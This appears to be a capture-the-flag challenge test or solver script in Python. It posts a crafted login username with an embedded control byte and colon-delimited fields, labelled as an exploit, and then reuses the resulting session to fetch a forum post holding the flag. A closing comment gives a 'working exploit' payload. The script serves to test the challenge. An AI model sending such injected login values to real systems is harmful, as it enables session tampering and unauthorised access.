# Ignore some of the test code
import requests
import sys

if len(sys.argv) < 3: 
    print ('command: python test.py URL CHALLNUM')
    exit()

url = sys.argv[1]
instance = int(sys.argv[2])

print ('test add user - expect 500 (exploit)')
response = requests.post(f"{url}/login", data={"user":"q\x05I:a:bAAAAAAAAA", "pass":""}, allow_redirects=False)
print (response.status_code)
print ('test successful login - expect 302 (looping to clear any faulty requests)')
counter = 0
while response.status_code != 302 and counter <= 3:
    print ('trying new user...')
    response = requests.post(f"{url}/login", data={"user":"a", "pass":"b"}, allow_redirects=False)
    print (response.status_code)
    # if response.status_code != 302: response = requests.post(f"{url}/login", data={"user":"", "pass":""}, allow_redirects=False)
    counter += 1
cookies = response.cookies
print (cookies)

print ('test GET /forum/post/3 - expect 200, True')
response = requests.get(f"{url}/forum/post/3", cookies=cookies)
print (f'bkctf in in response.text: {'bkctf' in response.text}')


# Working exploit
# q%05I:a:aHIJKLMNOP